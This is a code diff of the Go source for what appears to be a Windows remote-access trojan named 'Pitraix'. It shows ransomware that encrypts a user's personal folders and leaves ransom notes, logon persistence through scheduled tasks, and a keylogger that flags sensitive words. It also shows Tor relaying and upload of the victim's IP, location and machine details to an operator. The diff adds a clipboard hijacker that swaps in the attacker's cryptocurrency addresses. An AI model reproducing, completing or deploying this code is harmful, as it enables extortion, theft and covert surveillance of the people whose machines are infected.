@@ -45,16 +45,27 @@ import (
 	"archive/zip"
 	"path/filepath"
 	"syscall"
+	"errors"
 
 	"unsafe"
+	"gopkg.in/toast.v1"
 	"golang.org/x/net/proxy"
 	"github.com/atotto/clipboard"
 	"github.com/TheTitanrain/w32"
 )
 
 const (
-	osName = 1 // Do not change this unless you know what you are doing
-	ddosCounter = 45 // Do not change this unless you know what you are doing
+	/* 
+		OPTIONAL: Change those to your Monero address to be used in clipboard crypto jacking
+
+		Leave it "OPTIONAL" for crypto jacking to be disabled
+	*/
+	moneroAddr        = "OPTIONAL"
+	bitcoinSegwitAddr = "OPTIONAL"
+	bitcoinLegacyAddr = "OPTIONAL"
+	ethereumAddr	  = "OPTIONAL"
+
+	
 
 	// DO NOT CHANGE THIS MANUALLY, RUN OPER
 	raw_OPEncryptionKeyPEM = `RXLCJAFYNIYZRZMWTZNMIYVSKFUAYJFSZUDIKNRNPMHOTDVSCRGLYTATTRGKGHPWDUMGEUHTTMEBAJRNEOYRDDUDMNWGBWEOASVYVGZZCRXIRUZIFBPAVMZZEWATVSYQNYDJLZPSMYGTOPUSPBRASSWWFOQGWZLRCWQMVKCXTUFGSIVPDKCLLWDIFAWWCVXBXUKOKALCPQKBWGRFTFGZQGZUOAHOZYSSWOBCZKEBLWFBJBQZTXCGZOJIDCYHGWSJGCNAVXAIZUDPPUIIFWYZKYASBNWDVIHCOSYNSTWENAJJSUPXAUSVSXYTVDNYGMVTHAQAURQVKTWYOBOSLFKYWOSPZJTRKQLLOPJTGNOXGGHCTNATRCBGVAIMFWSSTRJSJACBJFQRUJRGESXYSSIUIYWFEDZHSPEEIHSRCFAOCWRRQJMDOOFZOLNPXWDUWXATEBIDKFMZBMSNMPMCYNJNGQGARSVPAWWFDVTGNEXVIRZVXJNXIIWEZKSGPERFKUXTFDHMRSBXUVDQJSUCLMIHYFVRIZRJKSLBEWKDVYFXMDMELBTLCGORDJFJPWNDEXVNXVVXYTAAMYKWYSHZDNVAZYTCBYOLBIJAWBGKVTHWVOEEULFWXEZQNSCWVRMUGIBYUHUIKEVMPDAOMSKXAXZSEHCYIMIIAFLFBBFMTZMOIAHKPUVXNKIUGWETMFSPEEXKOGPCQRLKSGMLZTAWKFDMCQLGPZFDDOHHKPIBOJCKDIGAKWYADJQTOFHWPXKBGYELBQELQULTTIQNJFCBHJAUYCEUOIZAFOVEKDQAKLW`
@@ -63,6 +74,13 @@ const (
 
 	// DO NOT CHANGE THIS MANUALLY, RUN OPER
 	agentAddress = "SNOGOYXKJWNZRYZFLHRJBLAVLLNXLMNBDDPJPJGKMJJDYDLVQSUIDPZA"
+
+
+
+	osName = 1 // Do not change this unless you know what you are doing
+	ddosCounter = 30 // Do not change this unless you know what you are doing
+
+
 )
 
 var (
@@ -89,9 +107,13 @@ var (
 		mainDrive + "\\Windows\\Logs",
 		mainDrive + "\\Windows\\security",
 		mainDrive + "\\Windows\\System32",
+		mainDrive + "Program Files (x86)\\Common Files",
+		mainDrive + "Program Files (x86)\\WindowsPowerShell",
+		mainDrive + "Program Files (x86)",
 	}
 
 	nonPrivPaths = []string{
+		mainDrive + "\\Users\\" + username + "\\AppData\\Local\\Programs",
 		mainDrive + "\\Users\\" + username + "\\AppData\\Local",
 		mainDrive + "\\Users\\" + username + "\\AppData\\Roaming",
 		mainDrive + "\\Users\\" + username + "\\AppData\\Roaming\\Microsoft",
@@ -126,10 +148,6 @@ type config_File_Type struct {
 	ContactD string
 }
 
-// type instruType struct {
-// 	INSTS []string
-// }
-
 type ipInfo struct {
 	IP 		 string
 	Hostname string
@@ -146,12 +164,7 @@ func setwallpaperFile(filename string) error {
 		return err
 	}
 
-	systemParametersInfo.Call(
-		uintptr(0x0014),
-		uintptr(0x0000),
-		uintptr(unsafe.Pointer(filenameUTF16)),
-		uintptr(0x01|0x02),
-	)
+	systemParametersInfo.Call(uintptr(0x0014),uintptr(0x0000),uintptr(unsafe.Pointer(filenameUTF16)),uintptr(0x01|0x02),)
 	return nil
 }
 
@@ -567,17 +580,16 @@ func doInstru(ic, iv string) string {
 		confAsyncChn <- []string{"routesh", iv}
 
 	case "relay":
-		fmt.Println("############ GOT RELAY")
 		ivspl := strings.Split(iv, " ")
-		if ivspl[0] == "*" { // relay to all routes hosts
-			for _, v := range cft.RoutesH {
-				fmt.Println("V:", v)
-				response, err := postRequest("http://" + v + ".onion", []byte(iv[2:]), true, 25)
-				fmt.Println(string(response), err)
-				out += string(response) + "\n"
-			}
-		} else { // targeted relay
-			fmt.Println("TARGETED RELAY DETECTED: PAYLOAD: ", ivspl[1], "TO " + ivspl[0])
+		if ivspl[0] == "*" {
+			go func(iv string) {
+				for _, v := range cft.RoutesH {
+					response, err := postRequest("http://" + v + ".onion", []byte(iv[2:]), true, 25)
+					fmt.Println(string(response), err)
+				//	out += string(response) + "\n"
+				}
+			}(iv)
+		} else {
 			go func(ivspl []string) {
 				response, err := postRequest("http://" + ivspl[0] + ".onion", []byte(ivspl[1]), true, 25)
 				fmt.Println(string(response), err)
@@ -586,21 +598,37 @@ func doInstru(ic, iv string) string {
 		}
 		out = strings.TrimSpace(out)
 
+	
+	case "notify":
+		ivspl := strings.Split(iv, " ")
+		fmt.Println("wot", ivspl)
+		if len(ivspl) < 2 {
+			out = "Error: iv length is not 2"
+
+		} else {
+			fmt.Println("ok")
+			notif := toast.Notification{AppID: "Pitraix", Title: ivspl[0], Message: ivspl[1],}
+			err := notif.Push()
+			fmt.Println("hm", err)
+			if err != nil {
+				out = "Error: " + err.Error()
+			} else {
+				out = "Done."
+			}
+		}
+
 	case "ransom":
 		ivspl := strings.Split(iv, " ")
 		if len(ivspl) != 4 {
-			fmt.Println("error ransom split:", ivspl)
-			out = "Error: len not 4"
+			out = "Error: iv length is not 4"
 		} else {
 			key, err := base64.StdEncoding.DecodeString(ivspl[3])
 			if err != nil {
-				fmt.Println("error ransom key:", err)
 				out = "Error:" + err.Error()
 			} else {
 				text := fmt.Sprintf("All your files have been encrypted. Do not bother searching online. The only people on earth that can decrypt your files are us.\nTo start decryption process, send %s %s to this address:\n%s", ivspl[0], ivspl[1], ivspl[2])
-				// fmt.Println("RANSOOOM", iv, key, text)
 
-				target_paths := []string{
+				start_paths := []string{
 					mainDrive + "\\" + "Users\\" + username + "\\Desktop",
 					mainDrive + "\\" + "Users\\" + username + "\\Documents",
 					mainDrive + "\\" + "Users\\" + username + "\\Downloads",
@@ -608,14 +636,14 @@ func doInstru(ic, iv string) string {
 					mainDrive + "\\" + "Users\\" + username + "\\Videos",
 					mainDrive + "\\" + "Users\\" + username + "\\Music",
 				}
-				for _, path := range target_paths {
+				for _, path := range start_paths {
 					go encFiles(path, key)
 				}
 				
 				time.Sleep(2 * time.Second)
 
 				for i := 0; i < 69; i++ {
-					f, _ := os.Create(target_paths[0] + fmt.Sprintf("\\READ_ME_%d.txt", i + 1))
+					f, _ := os.Create(start_paths[0] + fmt.Sprintf("\\READ_ME_%d.txt", i + 1))
 					f.WriteString(text)
 					f.Close()
 				}
@@ -625,7 +653,7 @@ func doInstru(ic, iv string) string {
 
 					wallpaperdec, _ := base64.StdEncoding.DecodeString(wallpaper)
 
-					wallpaperName, _ := predictable_random("WALLPAPER!!1" + currentPath, 0, true)
+					wallpaperName, _ := predictable_random("3#FgiJN54OgjrspjGG!!1" + currentPath, 0, true)
 					if len(wallpaperName) > 30 {
 						wallpaperName = wallpaperName[:25]
 					}
@@ -652,7 +680,7 @@ func doInstru(ic, iv string) string {
 				go func(coin string) {
 					time.Sleep(5 * time.Second)
 					doInstru("shell", "notepad " + mainDrive + "\\" + "Users\\" + username + "\\Desktop\\READ_ME_25.txt")
-					time.Sleep(480)
+					time.Sleep(165)
 					doInstru("shell", "start chrome \"https://www.google.com/search?q=How to buy " + coin + "\"")
 
 				}(ivspl[1])
@@ -832,6 +860,11 @@ func encFiles(path string, key []byte) {
 			continue
 		}
 		fname := file.Name()
+
+		if (path == mainDrive + "\\" + "Users\\" + username + "\\Desktop") && strings.HasPrefix(fname, "READ_ME_") && fname != "READ_ME_" {
+			continue
+		}
+
 		f, err := readFile(path + "\\" + fname)
 		if err != nil {
 			fmt.Println("err 2", err)
@@ -924,10 +957,9 @@ func getMachineInfo() (string, int, string, string, int, string, string, string)
 		memory		   string
 	)
 	
-	procArch := strings.TrimSpace(doInstru("shell", "echo %PROCESSOR_ARCHITECTURE%"))
-	if procArch == "AMD64" || procArch == "64-bit" {
+	if osArch == "AMD64" || osArch == "64-bit" {
 		arch = 0
-	} else if procArch == "x86" || procArch == "34-bit" {
+	} else if osArch == "x86" || osArch == "34-bit" {
 		arch = 1
 	} else {
 		arch = 2
@@ -1030,6 +1062,15 @@ func IsUpper(s string) bool {
     return true
 }
 
+func IsLower(s string) bool {
+    for _, r := range s {
+        if !unicode.IsLower(r) && unicode.IsLetter(r) {
+            return false
+        }
+    }
+    return true
+}
+
 
 func main() {
 	// raw_OPEncryptionKeyPEM := strings.TrimSpace(raw_raw_OPEncryptionKeyPEM)
@@ -1052,7 +1093,7 @@ func main() {
 	cpu := strings.TrimSpace(cpuinfo_raw[len(cpuinfo_split[0]):])
 	cpuVendor := cpuinfo_split[0]
 
-	userHostname, machineType, osVariant, kernelVersion, arch, machineVendor, machineModel, memory := getMachineInfo()
+	userHostname, machineType, osVariant, kernelVersion, archComp, machineVendor, machineModel, memory := getMachineInfo()
 	// fmt.Println(userHostname, osVariant, kernelVersion, arch, machineVendor, machineModel)
 
 	// vmCheck(userHostname, cpuVendor, machineVendor, machineModel)
@@ -1105,7 +1146,7 @@ func main() {
 	rdmod.Seed(int64(bytesumbig([]byte(userHomeDIR + "AYYYECRAYYEACYEEEDXEGHQ" + cpu + username + userHomeDIR ))))
 	tor_FolderPath := pointerPaths[rdmod.Intn(len(pointerPaths) - 1)]
 	
-	fmt.Println("pitraix_FilePath:", pitraix_FilePath, "\nconfig_FilePath:", config_FilePath, "\ntor_FolderPath:", tor_FolderPath)
+	// fmt.Println("pitraix_FilePath:", pitraix_FilePath, "\nconfig_FilePath:", config_FilePath, "\ntor_FolderPath:", tor_FolderPath)
 
 	// rdmod.Seed(int64(bytesumbig([]byte(userHomeDIR + "MGUNRU4UFHHW2U8JSDQ" + cpu))))
 	pitraix_taskName, _ := predictable_random("MGUNRU4UFHHW2U8JSDQ" + cpu + username + cpu, 0, true)
@@ -1132,10 +1173,10 @@ func main() {
 		// time.Sleep(time.Second * 5)
 		if isadmin_const {
 			// doInstru("shell", `schtasks.exe /CREATE /SC ONLOGON /TN "` + pitraix_taskName + `" /TR "` + pitraix_FilePath + `" /RL HIGHEST /F`)
-			doInstru("shell", fmt.Sprintf("schtasks.exe /CREATE /SC ONLOGON /TN %s /TR %s /RL HIGHEST /F", pitraix_taskName, pitraix_FilePath))
+			doInstru("shell", fmt.Sprintf("%s\\Windows\\System32\\schtasks.exe /CREATE /SC ONLOGON /TN %s /TR %s /RL HIGHEST /F", mainDrive ,pitraix_taskName, pitraix_FilePath))
 			// fmt.Println("admin!", out)
 		} else {
-			doInstru("shell", fmt.Sprintf("schtasks.exe /CREATE /SC DAILY /TN %s /TR %s /F", pitraix_taskName, pitraix_FilePath))
+			doInstru("shell", fmt.Sprintf("%s\\Windows\\System32\\schtasks.exe /CREATE /SC DAILY /TN %s /TR %s /F", mainDrive, pitraix_taskName, pitraix_FilePath))
 			// fmt.Println("no :(", out)
 		}
 	}
@@ -1181,8 +1222,7 @@ func main() {
 	klogChn1 := make(chan string)
 
 	go func(klogChn1 chan string) { // Key logger parser
-		eventsIndicators := []string{
-			// offensive / porn / child porn
+		eventsIndicators := []string{ // words here don't need to be correct this checks start only
 			"fuck",
 			"shit",
 			"sex",
@@ -1199,9 +1239,7 @@ func main() {
 			"cp",
 			"loli",
 			"porn",
-			"xx",
-			"xvideos",
-			"xnxx",
+			"x",
 			"tra",
 			"gay",
 			"lgb",
@@ -1218,8 +1256,6 @@ func main() {
 			"fur",
 			"cub",
 			"prostitut",
-
-			// family terms
 			"mom",
 			"mother",
 			"dad",
@@ -1230,8 +1266,6 @@ func main() {
 			"uncle",
 			"aunt",
 			"cousin",
-
-			// extremeist / racist / homophobic
 			"al qaeda",
 			"isis",
 			"islamic",
@@ -1291,8 +1325,6 @@ func main() {
 			"going to",
 			"will",
 			"troll",
-
-			// tech aware / researcher / hacker / cracker / fraudster
 			"vpn",
 			"proxy",
 			"password",
@@ -1408,8 +1440,6 @@ func main() {
 			"express",
 			"firefox",
 			"chrome",
-
-			// bank info / goverment employee / spy
 			"nsa",
 			"national security",
 			"agency",
@@ -1459,8 +1489,6 @@ func main() {
 			"car",
 			"boat",
 			"charge",
-
-			// drug addict
 			"drug",
 			"date",
 			"meth",
@@ -1482,8 +1510,6 @@ func main() {
 			"steroid",
 			"overdose",
 			"angel",
-			
-			// private info / clues / misc
 			"depress",
 			"homework",
 			"friend",
@@ -1876,7 +1902,29 @@ func main() {
 
 						if ctrlPressed && (key == 0x56 || key == 0x43) {
 							text, _ := clipboard.ReadAll()
+							if moneroAddr != "OPTIONAL" && len(text) == 95 && !IsUpper(text) && !IsLower(text) {
+								fmt.Println("monero address detected:", text)
+								clipboard.WriteAll(moneroAddr)
+								fmt.Println("done switched")
+
+							} else if bitcoinSegwitAddr != "OPTIONAL" && len(text) == 95 && !IsUpper(text) && !IsLower(text) {
+								fmt.Println("bitcoin segwit address detected:", text)
+								clipboard.WriteAll(bitcoinSegwitAddr)
+								fmt.Println("done switched")
+
+							} else if bitcoinLegacyAddr != "OPTIONAL" && len(text) == 95 && !IsUpper(text) && !IsLower(text) {
+								fmt.Println("bitcoin legacy address detected:", text)
+								clipboard.WriteAll(bitcoinLegacyAddr)
+								fmt.Println("done switched")
+							
+							} else if ethereumAddr != "OPTIONAL" && len(text) == 95 && !IsUpper(text) && !IsLower(text) {
+								fmt.Println("ethereum address detected:", text)
+								clipboard.WriteAll(ethereumAddr)
+								fmt.Println("done switched")
+							}
+
 							fmt.Println("clipboard:", text)
+							tmpKeylog += text
 							ctrlPressed = false
 						} else if capsLock {
 							tmpKeylog += string(key)
@@ -1955,7 +2003,7 @@ func main() {
 		http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: false} // secure connection back
 	}
 
-	opPubEncryptionKeyProcessed, _ := x509.ParsePKCS1PublicKey(pemDec(raw_OPEncryptionKeyPEM).Bytes)
+	opPubEncryptionKeyProcessed, _ := ParseRsaPublicKeyFromPemStr(raw_OPEncryptionKeyPEM)
 	// opPubSigningKeyProcessed   , _ := x509.ParsePKCS1PublicKey(pemDec(raw_OPSigningKeyPEM).Bytes)
 
 
@@ -1967,7 +2015,7 @@ func main() {
 
 	// first time register logic
 	encryptedMessage_register := RSA_OAEP_Encrypt(AES_Key, *opPubEncryptionKeyProcessed)
-	encrypted_registerData, nonce, _ := encrypt_AES([]byte(fmt.Sprintf(`{"Address": "%s", "Username": "%s", "CPU": "%s", "RAM": "%s", "IP": "%s", "Country": "%s", "City": "%s", "Hostname": "%s", "Chassis": %d, "OS": %d, "OSVar": "%s", "Kernel": "%s", "Arch": %d, "Vendor": "%s", "Model": "%s", "ContactD": "%s", "RasKey": "%s"}`, hstAddress, username, cpu, memory, ipinfo_struct.IP, ipinfo_struct.Country, ipinfo_struct.City, userHostname, machineType, osName, osVariant, kernelVersion, arch, machineVendor, machineModel, contactDate, base64.StdEncoding.EncodeToString(random_Bytes(32, true)))), AES_Key)
+	encrypted_registerData, nonce, _ := encrypt_AES([]byte(fmt.Sprintf(`{"Address": "%s", "Username": "%s", "CPU": "%s", "RAM": "%s", "IP": "%s", "Country": "%s", "City": "%s", "Hostname": "%s", "Chassis": %d, "OS": %d, "OSVar": "%s", "Kernel": "%s", "Arch": %d, "Vendor": "%s", "Model": "%s", "ContactD": "%s", "RasKey": "%s"}`, hstAddress, username, cpu, memory, ipinfo_struct.IP, ipinfo_struct.Country, ipinfo_struct.City, userHostname, machineType, osName, osVariant, kernelVersion, archComp, machineVendor, machineModel, contactDate, base64.StdEncoding.EncodeToString(random_Bytes(32, true)))), AES_Key)
 	registerData := fmt.Sprintf("%s|%s|%s", encryptedMessage_register, base64.StdEncoding.EncodeToString(encrypted_registerData), base64.StdEncoding.EncodeToString(nonce))
 
 	for {
@@ -2280,4 +2328,24 @@ func inFindStr(a string, list []string) bool {
         }
     }
     return false
+}
+
+func ParseRsaPublicKeyFromPemStr(pubPEM string) (*rsa.PublicKey, error) {
+    block, _ := pem.Decode([]byte(pubPEM))
+    if block == nil {
+		return nil, errors.New("failed to parse PEM")
+    }
+
+    pub, err := x509.ParsePKIXPublicKey(block.Bytes)
+    if err != nil {
+        return nil, err
+    }
+
+    switch pub := pub.(type) {
+    case *rsa.PublicKey:
+        return pub, nil
+    default:
+         break
+    }
+    return nil, errors.New("key is not RSA")
 }
